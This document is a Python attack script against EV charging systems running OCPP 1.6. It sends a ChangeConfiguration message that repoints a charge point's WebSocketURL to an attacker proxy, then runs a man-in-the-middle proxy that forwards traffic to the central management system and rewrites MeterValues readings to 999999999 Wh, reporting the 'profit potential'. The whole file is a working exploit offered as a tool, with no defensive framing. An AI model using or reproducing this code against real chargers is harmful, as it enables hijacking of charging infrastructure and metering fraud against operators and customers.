import asyncio
import json
import websockets
from uuid import uuid4
from rich.console import Console
from rich.panel import Panel

console = Console()

class OCPPAttackFramework:
    def __init__(self, target_url: str, ocpp_version: str):
        self.target_url = target_url  # CSMS URL, e.g., ws://localhost:9000/CP_1
        self.ocpp_version = ocpp_version
        self.proxy_port = 9001  # Proxy server port
        self.proxy_url = f"ws://localhost:{self.proxy_port}/CP_1"

    def _get_protocol(self) -> str:
        return "ocpp1.6" if self.ocpp_version == "1.6" else "ocpp2.0.1"

    async def _send_message(self, message, cp_id=None, timeout=2):
        try:
            cp_id = cp_id or f"CP_{uuid4().hex[:8]}"
            ws_url = self.target_url.rsplit("/", 1)[0] + f"/{cp_id}"
            ws = await websockets.connect(
                ws_url,
                subprotocols=[self._get_protocol()]
            )
            await ws.send(json.dumps(message))
            console.print(f"[bold green]✓[/] Sent: {json.dumps(message, indent=2)}")
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=timeout)
                console.print(f"[bold blue]←[/] Response: {response}")
            except asyncio.TimeoutError:
                console.print("[yellow]No response received[/]")
            return ws
        except (websockets.exceptions.ConnectionClosedError, ConnectionRefusedError, asyncio.TimeoutError) as e:
            console.print(f"[bold red]✗ Connection Error: {str(e)}[/]")
            return None
        except Exception as e:
            console.print(f"[bold red]✗ Unexpected Error: {str(e)}[/]")
            return None

    async def send_change_configuration(self, cp_id="CP_1"):
        if self.ocpp_version != "1.6":
            console.print("[bold red]ChangeConfiguration only supported for OCPP 1.6[/]")
            return
        message = [
            2,
            str(uuid4()),
            "ChangeConfiguration",
            {
                "key": "WebSocketURL",
                "value": self.proxy_url
            }
        ]
        ws = await self._send_message(message, cp_id=cp_id, timeout=5)
        if ws:
            await ws.close()

    async def mitm_proxy(self, websocket, path):
        cp_id = path.strip("/")
        csms_url = self.target_url.rsplit("/", 1)[0] + f"/{cp_id}"
        console.print(f"[bold yellow]MITM Proxy: Connecting to CSMS at {csms_url}[/]")
        async with websockets.connect(csms_url, subprotocols=[self._get_protocol()]) as csms_ws:
            console.print(f"[bold green]MITM Proxy: Connected to CSMS for {cp_id}[/]")
            
            async def forward_from_cp_to_csms():
                try:
                    async for message in websocket:
                        parsed = json.loads(message)
                        console.print(f"[bold green]← CP to Proxy[/]: {json.dumps(parsed, indent=2)}")
                        if self.ocpp_version == "1.6" and len(parsed) >= 3 and parsed[2] == "MeterValues":
                            original_value = parsed[3].get("meterValue", [{}])[0].get("sampledValue", [{}])[0].get("value", "0")
                            parsed[3]["meterValue"][0]["sampledValue"][0]["value"] = "999999999"
                            console.print(f"[bold red]Modified MeterValues: Changed {original_value} Wh to 999999999 Wh[/]")
                            console.print(f"[bold yellow]Profit Potential: {int(parsed[3]['meterValue'][0]['sampledValue'][0]['value']) - int(original_value)} Wh[/]")
                        await csms_ws.send(json.dumps(parsed))
                        console.print(f"[bold blue]→ Proxy to CSMS[/]: {json.dumps(parsed, indent=2)}")
                except websockets.exceptions.ConnectionClosed:
                    console.print("[bold red]CP connection closed[/]")

            async def forward_from_csms_to_cp():
                try:
                    async for message in csms_ws:
                        console.print(f"[bold blue]← CSMS to Proxy[/]: {message}")
                        await websocket.send(message)
                        console.print(f"[bold green]→ Proxy to CP[/]: {message}")
                except websockets.exceptions.ConnectionClosed:
                    console.print("[bold red]CSMS connection closed[/]")

            await asyncio.gather(forward_from_cp_to_csms(), forward_from_csms_to_cp())

    async def start_spoofing_attack(self):
        console.print(Panel("[bold]Starting OCPP Spoofing Attack[/]", style="bold magenta"))
        console.print("[bold cyan]Sending ChangeConfiguration to CP[/]")
        await self.send_change_configuration(cp_id="CP_1")
        proxy_url = f"ws://localhost:{self.proxy_port}/"
        console.print(f"[bold cyan]MITM Proxy listening on {proxy_url}[/]")
        server = await websockets.serve(
            self.mitm_proxy,
            "0.0.0.0",
            self.proxy_port,
            subprotocols=[self._get_protocol()]
        )
        await server.wait_closed()

async def main():
    attacker = OCPPAttackFramework(
        target_url="ws://localhost:9000/CP_1",
        ocpp_version="1.6"
    )
    await attacker.start_spoofing_attack()

if __name__ == "__main__":
    asyncio.run(main())
